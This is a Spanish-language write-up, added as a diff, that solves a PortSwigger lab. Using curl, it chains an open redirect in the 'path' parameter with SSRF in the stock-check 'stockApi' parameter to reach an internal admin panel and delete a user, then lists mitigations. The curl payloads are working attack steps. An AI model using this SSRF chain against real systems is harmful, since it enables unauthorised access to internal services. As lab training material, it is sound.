@@ -1,0 +1,270 @@
+---
+title: "Bypass de Filtro SSRF mediante Redirección Abierta"
+description: "Cómo evadir filtros SSRF usando una vulnerabilidad de redirección abierta, explotando un ataque encadenado para acceder a interfaces internas de administración."
+labUrl: "https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection"
+category: "SSRF"
+date: "2025-02-20"
+portswiggerDescription: "Este lab demuestra cómo evadir filtros SSRF usando una vulnerabilidad de redirección abierta. La aplicación tiene una funcionalidad de verificación de stock que carga datos desde un sistema interno, la URL está filtrada para prevenir ataques SSRF directos pero hay una vulnerabilidad de redirección abierta que puede ser explotada para evadir estos filtros."
+lang: "es"
+---
+
+import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
+import PartialContainer from '../../../components/PartialContainer.astro';
+
+## Conceptos Previos Necesarios Para Resolver El Lab
+
+<PartialContainer>
+  <CollapsiblePartial partial="ssrf" title="Server-Side Request Forgery (SSRF)" lang="es" />
+  <CollapsiblePartial partial="open-redirection" title="Vulnerabilidades de Redirección Abierta" lang="es" />
+  <CollapsiblePartial partial="ssrf-open-redirection-chain" title="Ataque Encadenado SSRF + Redirección Abierta" lang="es" />
+</PartialContainer>
+
+## Resolución
+
+Primero exploremos el lab e identifiquemos la funcionalidad de verificación de stock
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/" | cat
+```
+
+> **Desglose del comando**: \
+`-s` = modo silencioso (sin barra de progreso) \
+`| cat` = redirigir la respuesta a mi [comando cat personalizado](https://github.com/echoesofwhoami/echoes-bat-theme) para una visualización con estilo
+
+La página principal se muestra en la ruta raíz, explorémosla
+
+![Home page](/CurlSwiggerLabs/images/ssrf-filter-bypass-open-redirection/01_home_page.png)
+
+En el HTML de la página principal podemos encontrar el enlace al detalle del producto
+```html
+<SNIP>...<SNIP>
+      <a class="button" href="/product?productId=1">View details</a>
+  </div>
+<SNIP>...<SNIP>
+```
+Hagamos curl y veamos la respuesta.
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product?productId=1" | cat
+```
+
+La página de detalle del producto contiene los siguientes elementos clave:
+
+```html
+<SNIP>...<SNIP>
+
+  <form id="stockCheckForm" action="/product/stock" method="POST">
+      <select name="stockApi">
+          <option value="/product/stock/check?productId=1&storeId=1">London</option>
+          <option value="/product/stock/check?productId=1&storeId=2">Paris</option>
+          <option value="/product/stock/check?productId=1&storeId=3">Milan</option>
+      </select>
+      <button type="submit" class="button">Check stock</button>
+  </form>
+  <span id="stockCheckResult"></span>
+  <script src="/resources/js/stockCheckPayload.js"></script>
+  <script src="/resources/js/stockCheck.js"></script>
+  <div class="is-linkback">
+      <a href="/">Return to list</a>
+      <a href="/product/nextProduct?currentProductId=1&path=/product?productId=2">| Next product</a>
+  </div>
+
+<SNIP>...<SNIP>
+```
+
+Hay un par de cosas interesantes aquí:
+
+1. Algo de código javascript que proporciona el comportamiento del lado del cliente de esta página
+2. El parámetro path en este enlace: ```<a href="/product/nextProduct?currentProductId=1&path=/product?productId=2">| Next product</a>```
+
+Exploremos el código javascript para entender el comportamiento del lado del cliente de esta página:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/resources/js/stockCheckPayload.js" | cat
+```
+
+Respuesta:
+
+```javascript
+# stockCheckPayload.js
+window.contentType = 'application/x-www-form-urlencoded';
+
+function payload(data) {
+    return new URLSearchParams(data).toString();
+}
+```
+
+Este primer fragmento de JavaScript configura la cabecera de tipo de contenido y proporciona una función utilitaria para convertir datos del formulario en formato codificado URL para la petición HTTP.
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/resources/js/stockCheck.js" | cat
+```
+
+Respuesta:
+
+```javascript
+# stockCheck.js
+document.getElementById("stockCheckForm").addEventListener("submit", function(e) {
+    checkStock(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
+    e.preventDefault();
+});
+
+function checkStock(method, path, data) {
+    const retry = (tries) => tries == 0
+        ? null
+        : fetch(
+            path,
+            {
+                method,
+                headers: { 'Content-Type': window.contentType },
+                body: payload(data)
+            }
+          )
+            .then(res => res.status === 200
+                ? res.text().then(t => isNaN(t) ? t : t + " units")
+                : "Could not fetch stock levels!"
+            )
+            .then(res => document.getElementById("stockCheckResult").innerHTML = res)
+            .catch(e => retry(tries - 1));
+
+    retry(3);
+}
+```
+
+Este último script añade un event listener al evento submit del formulario HTML que vimos antes (con el id "stockCheckForm"), al activar este evento llamará a la función "checkStock" con el método "POST", la acción "product/stock" y los datos del formulario como parámetros ```checkStock(method, path, data)``` y usa la función payload para convertir los datos del formulario en una cadena x-www-form-urlencoded como cuerpo de la petición HTTP así como establecer la cabecera de tipo de contenido a application/x-www-form-urlencoded.
+
+Exploremos el comportamiento de la aplicación más a fondo. Primero, emulemos la petición javascript para verificar el stock de un producto:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=/product/stock/check?productId=1&storeId=1" | cat
+```
+
+> **Desglose del comando**: \
+`-H "Content-Type: application/x-www-form-urlencoded"` = establecer cabecera de tipo de contenido a application/x-www-form-urlencoded para emular la petición javascript \
+`-d "stockApi=/product/stock/check?productId=1&storeId=1"` = establecer el cuerpo de la petición con los datos del formulario, esto automáticamente establecerá el método HTTP a POST \
+
+Esto devuelve:
+
+```Response: "Missing parameter"```
+
+y me hizo darme cuenta de que este endpoint está llamando internamente a otro y ```&storeId=1``` no se está añadiendo como parámetro a la segunda petición sino que se está parseando en la primera, por eso obtenemos "Missing parameter".
+
+Validaré mis sospechas enviando una petición GET directamente a ```/product/stock/check?productId=1&storeId=1```
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock/check?productId=1&storeId=1" | cat
+```
+
+```Response: "414 units"```
+
+Ahora para estar absolutamente seguro reproduciré el mismo error no enviando el parámetro storeId
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock/check?productId=1" | cat
+```
+
+```Response: "Missing parameter"```
+
+Entonces para que funcione tenemos que codificar el ampersand en la primera petición
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=/product/stock/check?productId=1%26storeId=1" | cat
+```
+
+```Response: "414 units"```
+
+Esto confirma un vector SSRF, la petición se está realizando desde el parámetro stockApi.
+
+Ahora intentemos explotar la vulnerabilidad SSRF directamente intentando acceder a la interfaz interna de administración:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=http://192.168.0.12:8080/admin" | cat
+```
+
+```Response: "Invalid external stock check url 'Invalid URL'"```
+
+Como era de esperar por el nombre de este lab, el SSRF está bloqueado. La aplicación tiene un filtro que valida el parámetro `stockApi` y previene el acceso directo a URLs externas, particularmente direcciones de red internas.
+
+Ahora probemos la vulnerabilidad de redirección abierta que encontramos en el parámetro `path`:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/nextProduct?currentProductId=1&path=http://portswigger.net" -v
+```
+
+> **Desglose del comando**: \
+`-v` = modo verbose, esto mostrará las cabeceras de respuesta
+
+Respuesta: `HTTP/2 302` con `location: http://portswigger.net`
+
+![Product detail page](/CurlSwiggerLabs/images/ssrf-filter-bypass-open-redirection/04_curl_open_redirect.png)
+
+Redirige a portswigger.net, así que la redirección abierta funciona. La aplicación no valida el parámetro `path` y redirigirá a cualquier URL que proporcionemos. Esta es la vulnerabilidad clave que explotaremos para evadir el filtro SSRF.
+
+**¿Por qué no podemos explotar el parámetro path directamente para SSRF?**
+
+El parámetro `path` es usado por el endpoint `/product/nextProduct`, que simplemente realiza una redirección HTTP (302). No hace una petición del lado del servidor a la URL como lo hace la funcionalidad de verificación de stock. La vulnerabilidad SSRF está específicamente en la funcionalidad de verificación de stock donde el servidor hace una petición HTTP a la URL proporcionada.
+
+El endpoint de verificación de stock (`/product/stock`) es el vulnerable a SSRF porque:
+1. Acepta un parámetro `stockApi`
+2. Hace una petición HTTP real a esa URL desde el servidor
+3. Devuelve la respuesta de esa petición
+
+Sin embargo, el endpoint de verificación de stock tiene filtrado de URL que previene el acceso directo a sistemas internos.
+
+El endpoint de redirección abierta (`/product/nextProduct`) no tiene SSRF porque:
+1. Solo realiza una redirección, no una petición del lado del servidor
+2. La redirección ocurre del lado del cliente (el navegador sigue el 302)
+
+**La Cadena de Exploit**
+
+Necesitamos encadenar estas vulnerabilidades:
+1. Usar la redirección abierta para evadir el filtro de URL en la verificación de stock
+2. La verificación de stock seguirá la redirección a la interfaz interna de administración
+3. Esto nos da acceso SSRF indirecto a sistemas internos
+
+Creemos nuestro exploit:
+
+**Nota**: En este lab, la IP objetivo `192.168.0.12:8080` y la ubicación del panel de admin se proporcionan en la descripción del lab. En un escenario real, necesitarías descubrir esta información mediante enumeración de red interna, escaneo de puertos y técnicas de descubrimiento de rutas.
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin" | cat
+```
+
+Esto funciona porque:
+1. `stockApi` comienza con `/` (permitido - mismo dominio)
+2. El servidor solicita `/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin`
+3. El endpoint `nextProduct` redirige a `http://192.168.0.12:8080/admin`
+4. La verificación de stock sigue la redirección y accede a la interfaz interna de administración
+
+Respuesta:
+
+![Product detail page](/CurlSwiggerLabs/images/ssrf-filter-bypass-open-redirection/05_admin_panel.png)
+
+Con acceso al panel de administración, podemos eliminar al usuario carlos:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos" | cat
+```
+
+Respuesta:
+
+![Product detail page](/CurlSwiggerLabs/images/ssrf-filter-bypass-open-redirection/06_delete_carlos.png)
+
+Esta última petición aniquiló al usuario carlos, resolviendo el lab.
+
+## Mitigación
+
+1. **Validar todas las redirecciones**: Asegúrate de que las redirecciones solo vayan a dominios permitidos en una whitelist
+2. **Filtrar objetivos SSRF**: Implementa listas blancas estrictas para las URLs que pueden ser accedidas
+3. **Segmentación de red**: Separa los servicios internos de las aplicaciones expuestas externamente
+4. **Validación de URLs**: Parsea y valida correctamente las URLs antes de hacer peticiones, especialmente cuando se realizan peticiones del lado del servidor
